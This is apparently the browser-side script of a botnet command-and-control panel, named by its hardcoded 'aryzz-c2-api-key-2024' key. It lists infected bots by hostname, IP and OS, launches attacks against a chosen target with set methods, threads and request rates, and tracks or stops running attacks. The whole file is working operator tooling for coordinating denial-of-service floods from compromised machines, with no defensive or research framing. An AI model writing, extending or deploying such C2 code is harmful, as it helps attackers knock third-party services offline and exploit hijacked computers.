const API_URL = window.location.origin + '/api';
const API_KEY = 'aryzz-c2-api-key-2024';
let socket = null;

// Initialize
document.addEventListener('DOMContentLoaded', () => {
    connectWebSocket();
    refreshData();
    setInterval(refreshData, 10000); // Refresh every 10 seconds
    
    // Setup attack form
    document.getElementById('attack-form').addEventListener('submit', handleAttackSubmit);
});

// WebSocket Connection
function connectWebSocket() {
    socket = io(window.location.origin);
    
    socket.on('connect', () => {
        updateConnectionStatus(true);
        console.log('WebSocket connected');
    });
    
    socket.on('disconnect', () => {
        updateConnectionStatus(false);
        console.log('WebSocket disconnected');
    });
    
    socket.on('bot:registered', (bot) => {
        console.log('New bot registered:', bot);
        refreshData();
    });
    
    socket.on('attack:started', (attack) => {
        console.log('Attack started:', attack);
        refreshData();
    });
    
    socket.on('attack:stopped', (data) => {
        console.log('Attack stopped:', data);
        refreshData();
    });
    
    socket.on('stats:update', (data) => {
        console.log('Stats update:', data);
    });
}

function updateConnectionStatus(connected) {
    const statusEl = document.getElementById('connection-status');
    if (connected) {
        statusEl.className = 'px-3 py-1 rounded-full text-sm bg-green-600';
        statusEl.innerHTML = '<i class="fas fa-circle mr-1"></i> Connected';
    } else {
        statusEl.className = 'px-3 py-1 rounded-full text-sm bg-red-600';
        statusEl.innerHTML = '<i class="fas fa-circle mr-1"></i> Disconnected';
    }
}

// Tab Switching
function switchTab(tab) {
    // Update tab buttons
    document.querySelectorAll('.tab-button').forEach(btn => {
        btn.classList.remove('border-cyan-400', 'text-cyan-400');
        btn.classList.add('border-transparent', 'text-gray-400');
    });
    document.getElementById(`tab-${tab}`).classList.remove('border-transparent', 'text-gray-400');
    document.getElementById(`tab-${tab}`).classList.add('border-cyan-400', 'text-cyan-400');
    
    // Update content
    document.querySelectorAll('.tab-content').forEach(content => {
        content.classList.add('hidden');
    });
    document.getElementById(`content-${tab}`).classList.remove('hidden');
}

// Refresh Data
async function refreshData() {
    await Promise.all([
        loadStats(),
        loadBots(),
        loadAttacks()
    ]);
}

async function loadStats() {
    try {
        const response = await fetch(`${API_URL}/stats/overview`, {
            headers: { 'X-API-Key': API_KEY }
        });
        const data = await response.json();
        
        if (data.success) {
            document.getElementById('stat-total-bots').textContent = data.stats.bots.total;
            document.getElementById('stat-online-bots').textContent = data.stats.bots.online;
            document.getElementById('stat-running-attacks').textContent = data.stats.attacks.running;
            document.getElementById('stat-total-requests').textContent = formatNumber(data.stats.requests.total);
        }
    } catch (error) {
        console.error('Failed to load stats:', error);
    }
}

async function loadBots() {
    try {
        const response = await fetch(`${API_URL}/bots`, {
            headers: { 'X-API-Key': API_KEY }
        });
        const data = await response.json();
        
        if (data.success) {
            const tbody = document.getElementById('bots-table');
            
            if (data.bots.length === 0) {
                tbody.innerHTML = '<tr><td colspan="6" class="px-6 py-4 text-center text-gray-400">No bots connected</td></tr>';
                return;
            }
            
            tbody.innerHTML = data.bots.map(bot => `
                <tr class="hover:bg-gray-700">
                    <td class="px-6 py-4 text-sm font-mono">${bot.id.substring(0, 8)}...</td>
                    <td class="px-6 py-4 text-sm">${bot.hostname}</td>
                    <td class="px-6 py-4 text-sm">${bot.ip}</td>
                    <td class="px-6 py-4 text-sm">${bot.os}</td>
                    <td class="px-6 py-4 text-sm">
                        <span class="px-2 py-1 rounded-full text-xs ${bot.status === 'online' ? 'bg-green-600' : 'bg-red-600'}">
                            ${bot.status}
                        </span>
                    </td>
                    <td class="px-6 py-4 text-sm text-gray-400">${formatTime(bot.lastSeen)}</td>
                </tr>
            `).join('');
        }
    } catch (error) {
        console.error('Failed to load bots:', error);
    }
}

async function loadAttacks() {
    try {
        const response = await fetch(`${API_URL}/attacks?limit=50`, {
            headers: { 'X-API-Key': API_KEY }
        });
        const data = await response.json();
        
        if (data.success) {
            const tbody = document.getElementById('attacks-table');
            
            if (data.attacks.length === 0) {
                tbody.innerHTML = '<tr><td colspan="7" class="px-6 py-4 text-center text-gray-400">No attacks yet</td></tr>';
                return;
            }
            
            tbody.innerHTML = data.attacks.map(attack => `
                <tr class="hover:bg-gray-700">
                    <td class="px-6 py-4 text-sm font-mono">${attack.id.substring(0, 8)}...</td>
                    <td class="px-6 py-4 text-sm">${attack.target}</td>
                    <td class="px-6 py-4 text-sm">
                        <span class="px-2 py-1 bg-cyan-600 rounded text-xs">${attack.method}</span>
                    </td>
                    <td class="px-6 py-4 text-sm">${attack.threads}</td>
                    <td class="px-6 py-4 text-sm">
                        <span class="px-2 py-1 rounded-full text-xs ${getStatusColor(attack.status)}">
                            ${attack.status}
                        </span>
                    </td>
                    <td class="px-6 py-4 text-sm">${formatNumber(attack.stats?.totalRequests || 0)}</td>
                    <td class="px-6 py-4 text-sm">
                        ${attack.status === 'running' ? 
                            `<button onclick="stopAttack('${attack.id}')" class="px-3 py-1 bg-red-600 hover:bg-red-700 rounded text-xs">
                                <i class="fas fa-stop mr-1"></i> Stop
                            </button>` : 
                            '<span class="text-gray-500">-</span>'
                        }
                    </td>
                </tr>
            `).join('');
        }
    } catch (error) {
        console.error('Failed to load attacks:', error);
    }
}

async function handleAttackSubmit(e) {
    e.preventDefault();
    
    const attackData = {
        target: document.getElementById('attack-target').value,
        method: document.getElementById('attack-method').value,
        duration: parseInt(document.getElementById('attack-duration').value),
        threads: parseInt(document.getElementById('attack-threads').value),
        rpc: parseInt(document.getElementById('attack-rpc').value)
    };
    
    try {
        const response = await fetch(`${API_URL}/attack/start`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-API-Key': API_KEY
            },
            body: JSON.stringify(attackData)
        });
        
        const data = await response.json();
        
        if (data.success) {
            alert('✅ Attack started successfully!');
            switchTab('attacks');
            refreshData();
        } else {
            alert('❌ Failed to start attack: ' + data.error);
        }
    } catch (error) {
        alert('❌ Error: ' + error.message);
    }
}

async function stopAttack(attackId) {
    if (!confirm('Are you sure you want to stop this attack?')) return;
    
    try {
        const response = await fetch(`${API_URL}/attack/${attackId}/stop`, {
            method: 'POST',
            headers: { 'X-API-Key': API_KEY }
        });
        
        const data = await response.json();
        
        if (data.success) {
            alert('✅ Attack stopped');
            refreshData();
        } else {
            alert('❌ Failed to stop attack: ' + data.error);
        }
    } catch (error) {
        alert('❌ Error: ' + error.message);
    }
}

// Utility Functions
function formatNumber(num) {
    if (num >= 1000000) return (num / 1000000).toFixed(1) + 'M';
    if (num >= 1000) return (num / 1000).toFixed(1) + 'K';
    return num.toString();
}

function formatTime(timestamp) {
    const date = new Date(timestamp);
    const now = new Date();
    const diff = Math.floor((now - date) / 1000);
    
    if (diff < 60) return `${diff}s ago`;
    if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
    if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`;
    return `${Math.floor(diff / 86400)}d ago`;
}

function getStatusColor(status) {
    switch (status) {
        case 'running': return 'bg-yellow-600';
        case 'stopped': return 'bg-gray-600';
        case 'completed': return 'bg-green-600';
        default: return 'bg-gray-600';
    }
}
